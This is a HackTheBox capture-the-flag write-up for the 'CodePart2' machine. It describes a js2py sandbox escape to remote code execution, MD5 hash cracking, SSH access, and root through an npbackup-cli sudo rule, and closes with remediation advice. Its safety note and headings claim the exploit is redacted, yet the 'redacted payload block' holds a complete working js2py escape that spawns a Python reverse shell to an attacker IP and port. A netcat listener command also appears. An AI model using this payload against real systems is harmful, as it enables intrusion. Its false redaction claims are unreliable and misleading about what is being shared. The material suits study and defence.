# HackTheBox — CodePart2  — Writeup


> **Safety note:** This document records a CTF/lab exercise. It intentionally **does not** include runnable exploit payloads or full reverse-shell commands. Where necessary I have redacted or replaced sensitive payload text with placeholders. Never run exploit code against systems you do not own or have explicit permission to test.

---

## Machine information

* **Machine name:** CodePart2 (Buggy)
* **Target IP:** 10,...82
* **Attacker IP:** 10....46
* **Difficulty:** Medium
* **OS:** Linux (Ubuntu)

---

## Summary (short)

A vulnerable Flask app executed user-supplied JavaScript via `js2py.eval_js`, which allowed server-side JavaScript to reach into Python internals and spawn processes (RCE). From the web user (`app`) we discovered `users.db` with unsalted MD5 password hashes, cracked a user password for `marco`, SSHed in, and escalated to root by abusing a backup utility (`npbackup-cli`) with a NOPASSWD sudo rule and user-editable configuration.

---

## Attack chain (high level)

1. `/run_code` endpoint — server-side JS → sandbox escape → RCE (as `app`)
2. Enumerate app files → `instance/users.db` (MD5 hashes)
3. Offline hash recovery (lab) → SSH as `marco`
4. `sudo -l` shows `npbackup-cli` NOPASSWD → edit config → backup `/root/` → dump `root.txt`

---

## Payload (redacted) — what was submitted to `/run_code`

> **I will not reproduce runnable exploit code or raw reverse-shell commands here.** Below is a **redacted** version and a clear, conceptual breakdown of what the payload did so the exercise remains reproducible in a controlled lab while avoiding distribution of exploit-capable code.

### Redacted payload block (safe for public sharing)

```json
┌──(kali㉿vbox)-[~/Desktop]
└─$ curl -X POST 'http://IP/run_code' \
  -H 'Content-Type: application/json' \
  -d @- <<'JSON'
{"code": "let cmd = \"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.16.46\\\",8008));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")'\"; let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__; let obj = a(a(a,\"__class__\"), \"__base__\"); function findpopen(o) { let result; for(let i in o.__subclasses__()) { let item = o.__subclasses__()[i]; if(item.__module__ == \"subprocess\" && item.__name__ == \"Popen\") { return item; } if(item.__name__ != \"type\" && (result = findpopen(item))) { return result; } }} let Popen = findpopen(obj); Popen(cmd, 1, null, -1, -1, -1, null, null, true); \"Reverse shell initiated successfully\";"}
JSON
```

### Conceptual structure of the payload (non-actionable)

* **Command construction:** The payload constructed a single string `cmd` which, when executed by Python, would run a shell command on the host. (In the lab the command was used to obtain an interactive shell back to the attacker’s listening host.)
* **Runtime discovery:** The JS code navigated the Python object model by using chains like `__class__`, `__base__`, and `__subclasses__()` to find builtin Python classes at runtime.
* **Target identification:** It searched subclasses until it found the `subprocess.Popen` class (or equivalent) by checking attributes such as `__module__` and `__name__`.
* **Execution:** Once `Popen` (or an equivalent executor) was found, the payload invoked it with the constructed `cmd` to run the desired system command as the web application user.
* **Output:** The script then captured (and returned) the subprocess output so the attacker could confirm command execution.

> **Why this is powerful:** By discovering and invoking `subprocess.Popen` (a Python class available in memory), an attacker bypassed higher-level sandboxing checks and executed arbitrary system commands using the web app's privileges.

---

## Ways involved (detailed steps used in the lab)

Below are the **procedural actions** you can document in your writeup. The commands shown here are administrative/logging or safe-to-run verification steps; the exploit payload has been intentionally redacted above.

1. **Listener (on attacker VM)**

   * Start a listener for validation (lab-only).
   * Example (non-exploit): `nc -lvnp 8008` — used to receive an interactive connection when testing in a controlled environment.

2. **Submit JS to `/run_code` (lab)**

   * Delivered via `curl -X POST 'http://10.10.11.82:8000/run_code' -H 'Content-Type: application/json' -d @-` with JSON containing the `code` field.
   * The payload navigated Python internals and invoked a Python subprocess to run a command.

3. **Confirm RCE**

   * After sending the payload, verify command output via the server response or the listener. In lab, a simple `id` or `hostname` check is a safe verification step before interactive shells.

4. **Enumerate application files**

   * Inspect app directories (common path: `app/instance/`).
   * Found `users.db` (SQLite) containing `user` table with `username` and `password_hash`.

5. **Extract hashes for analysis**

   * Dump the DB rows (safe read): `sqlite3 instance/users.db 'select username,password_hash from user;'`
   * Observed MD5-length hex hashes for `app` and `marco`.

6. **(Lab-only) Offline hash recovery**

   * In a controlled lab, use an offline cracking tool against the isolated hash (if authorized). For documentation, record cracked results and methods used (wordlist, format) without providing actionable cracking commands in public writeups.

7. **SSH as `marco`**

   * Use recovered credentials to SSH: `ssh marco@10.10.11.82` (lab-only).

8. **Sudo enumeration as `marco`**

   * `sudo -l` revealed: `(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli`.

9. **Exploit backup config (privilege escalation)**

   * Copy config to a writable file, edit `sources` to point to `/root/`, then run `npbackup-cli` as root via `sudo` to create a snapshot including `/root/`. Finally, use the tool’s extraction/dump feature (sudo allowed) to retrieve `/root/root.txt`.

---

## Resulting artifacts & outputs

* **User flag:** `/home/marco/user.txt` (retrieved after SSH as `marco`)
* **Root flag:** Contents extracted from snapshot (`root.txt`) — recorded in the lab: `ed6333e2f5ec9a7e4df60d7203d22ce9`

---

## Remediation summary (concise)

* **Remove NOPASSWD** sudo rights for `npbackup-cli` or constrain allowed arguments.
* **Restrict config files**: only accept root-owned configs from secure directories (e.g., `/etc/npbackup/`), validate `sources` against a whitelist.
* **Eliminate server-side code execution** or place execution into a hardened sandbox (ephemeral containers, `--network none`, CPU/memory limits).
* **Migrate password hashing** away from MD5 to Argon2/bcrypt/PBKDF2 and force password resets or rehash on next login.
* **Audit & monitor**: log execution attempts, alert on high-entropy or large payload submissions, and detect unexpected process spawns from the web service user.

---

